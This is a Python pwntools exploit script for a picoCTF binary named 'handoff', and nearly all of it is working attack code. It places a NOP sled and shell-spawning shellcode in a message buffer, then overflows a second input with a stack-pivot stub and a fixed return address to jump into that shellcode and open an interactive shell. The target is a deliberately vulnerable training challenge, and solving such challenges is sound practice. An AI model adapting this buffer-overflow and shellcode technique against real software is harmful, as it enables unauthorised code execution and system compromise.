#!/usr/bin/env python3
from pwn import *
import time

bin_file = './handoff'
context(os = 'linux', arch = 'amd64')
context(terminal = ['tmux', 'splitw', '-h'])
context.log_level = 'debug'

binf = ELF( bin_file )

def attack( proc, **kwargs ):
    
    shellcode  = asm(shellcraft.sh())
    somenop    = asm("nop") * (63 - len(shellcode))
    helpercode = asm("nop; sub rsp, 0x2e8; jmp rsp") + b'a' * 10 + p64(0x40116c)
    
    proc.sendlineafter( '3. Exit the app', b'1' )
    proc.sendlineafter( 'name: ', b'name' )
    
    proc.sendlineafter( '3. Exit the app', b'2' )
    proc.sendlineafter( 'send a message to?', b'0' )
    proc.sendlineafter( 'send them?', somenop + shellcode )
    
    proc.sendlineafter( '3. Exit the app', b'3' )
    proc.sendlineafter( 'really appreciate it: ', helpercode )
    
    #info( proc.recvall() )

def main():
    
    adrs = "shape-facility.picoctf.net"
    port = 53574
    
    #proc = gdb.debug( bin_file )
    proc = process( bin_file )
    #proc = remote( adrs, port )
    
    attack( proc )
    proc.interactive()

if __name__ == '__main__':
    main()
